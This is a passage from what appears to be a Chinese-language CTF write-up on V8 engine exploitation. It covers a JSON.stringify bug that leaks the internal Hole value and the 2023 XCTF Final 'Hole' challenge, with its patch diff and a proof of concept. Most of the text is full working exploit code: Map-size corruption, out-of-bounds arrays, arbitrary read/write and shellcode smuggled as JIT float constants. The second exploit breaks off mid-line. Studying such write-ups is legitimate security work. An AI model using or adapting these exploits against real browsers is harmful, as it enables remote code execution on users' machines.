<code>ThrowInternal</code> 设置 <code>pending_exception</code>
，如果没有设置 <code>pending_exception</code> 在用户的 JS 代码中会将
<code>pending_exception</code> 的默认值 <code>Hole</code> catch
出来，这就是漏洞的成因。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">Isolate::ThrowInternal</span><span class="params">(Object raw_exception, MessageLocation* location)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// Set the exception being thrown.</span></span><br><span class="line">  <span class="built_in">set_pending_exception</span>(*exception);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(<span class="built_in">heap</span>()).<span class="built_in">exception</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Object <span class="title">Throw</span><span class="params">(Object exception)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">ThrowInternal</span>(exception, <span class="literal">nullptr</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::SerializeArrayLikeSlow</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Handle&lt;JSReceiver&gt; object, <span class="type">uint32_t</span> start, <span class="type">uint32_t</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// We need to write out at least two characters per array element.</span></span><br><span class="line">  <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kMaxSerializableArrayLength = String::kMaxLength / <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (length &gt; kMaxSerializableArrayLength) &#123;</span><br><span class="line">    isolate_-&gt;<span class="built_in">Throw</span>(*isolate_-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewInvalidStringLengthError</span>());</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>具体利用手法在 Hole 已经介绍过了，exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [], b = [];</span><br><span class="line">    <span class="keyword">let</span> s = <span class="string">&#x27;&quot;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">0x800000</span>);</span><br><span class="line">    a[<span class="number">20000</span>] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) a[i] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) b[i] = a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (hole) &#123;</span><br><span class="line">        <span class="keyword">return</span> hole;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;could not trigger&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x15</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">14</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_offset = <span class="title function_">read</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] code offset: &quot;</span> + <span class="title function_">hex</span>(code_offset));</span><br><span class="line"></span><br><span class="line">code_offset += <span class="number">0x68n</span>;</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>, code_offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="例题2023xctf-final-hole">例题：2023XCTF Final Hole</h2>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/xctf2023_hole" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard 247b33e9218a9345f0073f45b967530b38153272 </span><br><span class="line">gclient sync</span><br><span class="line">git apply diff</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div> 观察 <code>patch</code> 文件，首先发现对
<code>JSMap</code> 的 <code>Hole</code> 检查被 patch
掉了，因此可以考虑将 <code>Hole</code> 泄露出来然后借助
<code>JSMap</code> 进行 <code>Hole</code> 利用。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc</span><br><span class="line">index f<span class="number">6238e3072</span>.<span class="number">.17821</span>d3124 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-collections-gen.cc</span><br><span class="line">+++ b/src/builtins/builtins-collections-gen.cc</span><br><span class="line">@@ <span class="number">-1765</span>,<span class="number">7</span> <span class="number">+1765</span>,<span class="number">7</span> @@ <span class="built_in">TF_BUILTIN</span>(MapPrototypeDelete, CollectionsBuiltinsAssembler) &#123;</span><br><span class="line">                          <span class="string">&quot;Map.prototype.delete&quot;</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// This check breaks a known exploitation technique. See crbug.com/1263462</span></span><br><span class="line">-  <span class="built_in">CSA_CHECK</span>(<span class="keyword">this</span>, <span class="built_in">TaggedNotEqual</span>(key, <span class="built_in">TheHoleConstant</span>()));</span><br><span class="line">+  <span class="comment">// CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br><span class="line"> </span><br><span class="line">   <span class="type">const</span> TNode&lt;OrderedHashMap&gt; table =</span><br><span class="line">       <span class="built_in">LoadObjectField</span>&lt;OrderedHashMap&gt;(<span class="built_in">CAST</span>(receiver), JSMap::kTableOffset);</span><br></pre></td></tr></table></figure></div>
然后就是 <code>original_map.UnusedPropertyFields()</code>
的判断处加了一个 <code>times</code> 条件 。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">diff --git a/src/compiler/js-native-context-specialization.cc b/src/compiler/js-native-context-specialization.cc</span><br><span class="line">index <span class="number">39302152</span>ed.<span class="number">.3193065</span>d7d <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/js-native-context-specialization.cc</span><br><span class="line">+++ b/src/compiler/js-native-context-specialization.cc</span><br><span class="line">@@ <span class="number">-29</span>,<span class="number">13</span> <span class="number">+29</span>,<span class="number">12</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/feedback-vector.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/heap-number.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/string.h&quot;</span></span></span><br><span class="line">-</span><br><span class="line">+<span class="type">int</span> times=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"> <span class="keyword">namespace</span> internal &#123;</span><br><span class="line"> <span class="keyword">namespace</span> compiler &#123;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">namespace</span> &#123;</span><br><span class="line">-</span><br><span class="line"> <span class="function"><span class="type">bool</span> <span class="title">HasNumberMaps</span><span class="params">(JSHeapBroker* broker, ZoneVector&lt;MapRef&gt; <span class="type">const</span>&amp; maps)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (MapRef map : maps) &#123;</span><br><span class="line">     <span class="keyword">if</span> (map.<span class="built_in">IsHeapNumberMap</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">@@ <span class="number">-2812</span>,<span class="number">7</span> <span class="number">+2811</span>,<span class="number">7</span> @@ JSNativeContextSpecialization::<span class="built_in">BuildPropertyStore</span>(</span><br><span class="line">       <span class="comment">// with this transitioning store.</span></span><br><span class="line">       MapRef transition_map_ref = transition_map.<span class="built_in">value</span>();</span><br><span class="line">       MapRef original_map = transition_map_ref.<span class="built_in">GetBackPointer</span>().<span class="built_in">AsMap</span>();</span><br><span class="line">-      <span class="keyword">if</span> (original_map.<span class="built_in">UnusedPropertyFields</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">+      <span class="keyword">if</span> (original_map.<span class="built_in">UnusedPropertyFields</span>() == <span class="number">0</span> &amp;&amp; times--==<span class="number">0</span>) &#123;</span><br><span class="line">         <span class="built_in">DCHECK</span>(!field_index.<span class="built_in">is_inobject</span>());</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// Reallocate the properties &#123;storage&#125;.</span></span><br></pre></td></tr></table></figure></div> 通过调试观察
<code>JSObject</code> 的 <code>Map</code> 发现
<code>unused property fields</code> 是用于记录存储
<code>properties</code> 的 <code>PropertyArray</code>
还有多少空闲位置。</p>
<p>结合对代码上下文的分析，发现这里的逻辑是在为 <code>JSObject</code>
添加新的属性时如果 <code>unused property fields</code> 为 0
则申请一个新的 <code>PropertyArray</code> 来存储 <code>properties</code>
。这里修改判断 <code>unused property fields</code> 为 0 的条件可能会造成
<code>PropertyArray</code> 越界。</p>
<p>要注意的是这个代码是在 JIT 的时候执行的。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check if we need to perform a transitioning store.</span></span><br><span class="line">base::Optional&lt;MapRef&gt; transition_map = access_info.<span class="built_in">transition_map</span>();</span><br><span class="line"><span class="keyword">if</span> (transition_map.<span class="built_in">has_value</span>()) &#123;</span><br><span class="line">  <span class="comment">// Check if we need to grow the properties backing store</span></span><br><span class="line">  <span class="comment">// with this transitioning store.</span></span><br><span class="line">  MapRef transition_map_ref = transition_map.<span class="built_in">value</span>();</span><br><span class="line">  MapRef original_map = transition_map_ref.<span class="built_in">GetBackPointer</span>().<span class="built_in">AsMap</span>();</span><br><span class="line">  <span class="keyword">if</span> (original_map.<span class="built_in">UnusedPropertyFields</span>() == <span class="number">0</span> &amp;&amp; times--==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">DCHECK</span>(!field_index.<span class="built_in">is_inobject</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Reallocate the properties &#123;storage&#125;.</span></span><br><span class="line">    storage = effect = <span class="built_in">BuildExtendPropertiesBackingStore</span>(</span><br><span class="line">        original_map, storage, effect, control);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform the actual store.</span></span><br><span class="line">    effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">StoreField</span>(field_access),</span><br><span class="line">                              storage, value, effect, control);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Atomically switch to the new properties below.</span></span><br><span class="line">    field_access = AccessBuilder::<span class="built_in">ForJSObjectPropertiesOrHashKnownPointer</span>();</span><br><span class="line">    value = storage;</span><br><span class="line">    storage = receiver;</span><br><span class="line">  &#125;</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">      <span class="built_in">common</span>()-&gt;<span class="built_in">BeginRegion</span>(RegionObservability::kObservable), effect);</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">      <span class="built_in">simplified</span>()-&gt;<span class="built_in">StoreField</span>(AccessBuilder::<span class="built_in">ForMap</span>()), receiver,</span><br><span class="line">      <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">Constant</span>(transition_map_ref), effect, control);</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">StoreField</span>(field_access), storage,</span><br><span class="line">                            value, effect, control);</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">FinishRegion</span>(),</span><br><span class="line">                            <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">UndefinedConstant</span>(), effect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 因此有如下
POC ：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    obj.<span class="property">b1</span> = <span class="number">1</span>;</span><br><span class="line">    obj.<span class="property">b2</span> = <span class="number">2</span>;</span><br><span class="line">    obj.<span class="property">b3</span> = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_hole</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123; <span class="attr">sky</span>: <span class="number">123</span> &#125;;</span><br><span class="line">        obj.<span class="property">a2</span> = <span class="number">1</span>;</span><br><span class="line">        obj.<span class="property">a3</span> = <span class="number">2</span>;</span><br><span class="line">        obj.<span class="property">a4</span> = <span class="number">3</span>;</span><br><span class="line">        <span class="title function_">trigger</span>(obj); </span><br><span class="line">        hole_array = [, <span class="literal">undefined</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// % DebugPrint(obj);</span></span><br><span class="line">    <span class="comment">// % SystemBreak();</span></span><br><span class="line">    <span class="keyword">return</span> obj.<span class="property">b3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调试发现，由于 <code>trigger</code> 函数优化后在对
<code>unused property fields</code> 的检查上存在漏洞，导致
<code>PropertyArray</code> 越界可以越界读到 <code>hole_array</code> 上将
<code>Hole</code> 泄露出来。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b2df67a234f2cd34bb32397526594f01.png"
                     
alt="在这里插入图片描述" 
                > 这里要注意的是 <code>hole_array</code>
必须不声明直接赋值，否则不会和 <code>PropertyArray</code> 重叠。</p>
<p><code>Hole</code> 泄露出来后的利用就很常规了。exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    obj.<span class="property">b1</span> = <span class="number">1</span>;</span><br><span class="line">    obj.<span class="property">b2</span> = <span class="number">2</span>;</span><br><span class="line">    obj.<span class="property">b3</span> = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_hole</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123; <span class="attr">sky</span>: <span class="number">123</span> &#125;;</span><br><span class="line">        obj.<span class="property">a2</span> = <span class="number">1</span>;</span><br><span class="line">        obj.<span class="property">a3</span> = <span class="number">2</span>;</span><br><span class="line">        obj.<span class="property">a4</span> = <span class="number">3</span>;</span><br><span class="line">        <span class="title function_">trigger</span>(obj); </span><br><span class="line">        hole_array = [, <span class="literal">undefined</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// % DebugPrint(obj);</span></span><br><span class="line">    <span class="comment">// % SystemBreak();</span></span><br><span class="line">    <span class="keyword">return</span> obj.<span class="property">b3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">get_hole</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hole);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x15</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">13</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">21</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">21</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">21</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">21</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_offset = <span class="title function_">offset_of</span>(shellcode);</span><br><span class="line"><span class="keyword">var</span> leak_offset = (<span class="title function_">read</span>(shellcode_offset + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>) + 